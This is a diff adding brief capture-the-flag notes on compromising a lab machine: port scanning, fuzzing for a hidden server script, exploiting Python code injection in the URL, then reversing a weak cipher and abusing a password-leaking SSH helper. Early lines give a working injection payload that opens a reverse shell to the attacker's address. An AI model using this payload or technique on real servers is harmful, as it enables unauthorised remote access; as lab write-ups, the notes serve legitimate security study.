@@ -1,0 +1,15 @@
+- Two ports open 22-ssh and 8080-http
+- Website at 8080 hints at "the current source code for the web server is in 'SuperSecureServer.py' in the secret development directory"
+- Used ffuf to fuzz out path with ./ffuf -c -D -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py -w ../wordlists/directory-list-2.3-medium.txt
+- There seems to be a code execution vulnerability directly in the url so have to do something like http://localhost:8080/index.html';path="/";print("Lol");' to print Lol in my console (server console)
+- Used http://10.10.10.168:8080/index.html';s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.218",4000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash");' to get reverse shell
+- Found a user robert. Could cd into his home directory and but user.txt was owned by him.
+    - Some files in his home were
+    - passwordreminder.txt - ´ÑÈÌÉàÙÁÑé¯·¿k
+    - out.txt - ¦ÚÈêÚÞØÛÝÝ×ÐÊßÞÊÚÉæßÝËÚÛÚêÙÉëéÑÒÝÍÐêÆáÙÞãÒÑÐáÙ¦ÕæØãÊÎÍßÚêÆÝáäèÎ
+    - p.py 
+    - check.txt - Encrypting this file with your key should result in out.txt, make sure your key is correct! 
+    - SuperSecureCrypt.py
+    - BetterSSH
+- Reverse engineered encryption mechanism (in reverse.py) because i had a pair of encrypted string (out.txt) and decrypted string (check.txt)
+- BetterSSH gave a shell as any user inside ssh as long as his system password was known and it copied that password into a file in /tmp/SSH during runtime 
